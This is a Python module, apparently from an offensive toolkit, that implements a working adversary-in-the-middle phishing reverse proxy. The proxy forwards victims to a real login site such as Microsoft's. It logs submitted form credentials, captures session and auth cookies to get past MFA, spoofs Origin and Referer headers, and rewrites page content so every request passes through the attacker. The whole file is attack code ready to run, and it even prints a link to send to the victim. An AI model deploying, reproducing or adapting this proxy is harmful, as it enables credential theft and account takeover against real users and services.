import os
import logging
import requests
import questionary
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from flask import Flask, request, Response
from rich.console import Console
from core.ui import draw_header, Q_STYLE
from core.database import db

# Suppress noisy Flask development logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
app = Flask(__name__)

# Global state to share between the Flask routes and the CLI
class AitMState:
    target_url = ""
    target_domain = ""
    captured_creds = 0

state = AitMState()

# Added OPTIONS, PUT, and DELETE methods to support modern web app CORS requests for CSS/Fonts
@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'])
@app.route('/<path:path>', methods=['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'])
def proxy(path):
    """The advanced AitM reverse proxy engine with CSS/JS routing."""
    
    url = f"{state.target_url}/{path}"
    if request.query_string:
        url += f"?{request.query_string.decode('utf-8')}"

    # 1. INTERCEPT CREDENTIALS (Supports both Forms and JSON payloads)
    if request.method == 'POST':
        form_data = request.form.to_dict()
        if form_data:
            state.captured_creds += 1
            console.print(f"\n[bold red][!] INTERCEPTED POST DATA from {request.remote_addr}:[/bold red]")
            for key, value in form_data.items():
                if len(value) < 200: 
                    console.print(f"    [white]{key}:[/white] [bold yellow]{value}[/bold yellow]")
            
            cred_log = "\n".join([f"{k}: {v}" for k, v in form_data.items() if len(v) < 200])
            db.log("AitM-Proxy", request.remote_addr, f"Captured Form Submission:\n{cred_log}", "CRITICAL")

    # 2. STRIP AND SPOOF HEADERS (Bypass CORS and Anti-Bot protections)
    headers = {}
    for key, value in request.headers:
        # We strip 'Accept-Encoding' to force the server to send uncompressed CSS/HTML so we can read it
        if key.lower() not in ['host', 'accept-encoding', 'origin', 'referer']:
            headers[key] = value
            
    # Spoof Origin and Referer so the target server hands over the CSS files without blocking us
    headers['Origin'] = state.target_url
    headers['Referer'] = f"{state.target_url}/"
    
    try:
        # Use request.get_data() to properly handle raw JSON payloads in modern apps
        resp = requests.request(
            method=request.method,
            url=url,
            headers=headers,
            data=request.get_data(), 
            cookies=request.cookies,
            allow_redirects=False,
            verify=False
        )
    except Exception as e:
        return f"Proxy Route Error: {e}", 500

    # 3. INTERCEPT SET-COOKIE HEADERS (MFA Session Stealing)
    if 'Set-Cookie' in resp.headers:
        cookie_data = resp.headers['Set-Cookie']
        if any(x in cookie_data.lower() for x in ['session', 'token', 'auth']):
            console.print(f"\n[bold magenta][!] INTERCEPTED AUTHENTICATION COOKIE (MFA BYPASS TOKEN)![/bold magenta]")
            console.print(f"    [dim]{cookie_data[:150]}...[/dim]")
            db.log("AitM-Proxy", request.remote_addr, f"Captured Auth Cookie: {cookie_data}", "CRITICAL")

    content = resp.content
    content_type = resp.headers.get('Content-Type', '').lower()

    # 4. DEEP REWRITE ENGINE (HTML, CSS, JS)
    if 'text/html' in content_type:
        soup = BeautifulSoup(content, 'html.parser')
        
        # Force all CSS links to route through our proxy
        for tag in soup.find_all(['a', 'link'], href=True):
            tag['href'] = tag['href'].replace(state.target_url, "")
            
        # Force all scripts, images, and iframes to route through our proxy
        for tag in soup.find_all(['script', 'img', 'iframe'], src=True):
            tag['src'] = tag['src'].replace(state.target_url, "")
            
        for form in soup.find_all('form', action=True):
            form['action'] = form['action'].replace(state.target_url, "")
            
        content = soup.encode('utf-8')
        
    elif 'text/css' in content_type or 'javascript' in content_type:
        # Sometimes CSS and JS contain hardcoded absolute URLs for fonts/assets (@import).
        # We do a raw text replacement to hijack those as well.
        try:
            text_content = content.decode('utf-8', errors='ignore')
            text_content = text_content.replace(state.target_url, "")
            content = text_content.encode('utf-8')
        except:
            pass

    # 5. RECONSTRUCT HEADERS
    # We must strip encoding headers because we modified the content payload and ruined the original compression
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    resp_headers = [(name, value) for (name, value) in resp.headers.items() if name.lower() not in excluded_headers]
    
    return Response(content, resp.status_code, resp_headers)

def run_cloner():
    draw_header("Adversary-in-the-Middle (AitM) Reverse Proxy")
    
    console.print("[dim]This module deploys a dynamic reverse proxy to intercept web traffic.[/dim]")
    console.print("[dim]It transparently forwards the victim to the real site while harvesting credentials and MFA Session Cookies.[/dim]\n")

    target = questionary.text("Target URL to Proxy/Clone (e.g., https://login.microsoftonline.com):", style=Q_STYLE).ask()
    if not target: return
    
    if not target.startswith("http"):
        target = "https://" + target
        
    state.target_url = target.rstrip('/')
    state.target_domain = urlparse(state.target_url).netloc

    port_str = questionary.text("Local port to host the proxy on (Default 80):", default="80", style=Q_STYLE).ask()
    if not port_str: return
    port = int(port_str)

    console.print(f"\n[bold green][*] Initializing AitM Proxy Engine...[/bold green]")
    console.print(f"[*] Phishing URL (Send this to the victim): [bold cyan]http://<YOUR_IP>:{port}/[/bold cyan]")
    console.print(f"[*] Proxying all traffic transparently to: [white]{state.target_url}[/white]")
    console.print("[bold yellow][!] Listening for credentials and MFA session cookies... (Press Ctrl+C to stop)[/bold yellow]\n")

    try:
        app.run(host='0.0.0.0', port=port, threaded=True)
    except PermissionError:
        console.print("[bold red][!] Permission denied. Binding to port 80 requires 'sudo'.[/bold red]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Shutting down AitM Proxy...[/yellow]")
    except Exception as e:
        console.print(f"\n[bold red][!] Proxy Error:[/bold red] {e}")

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

if __name__ == "__main__":
    run_cloner()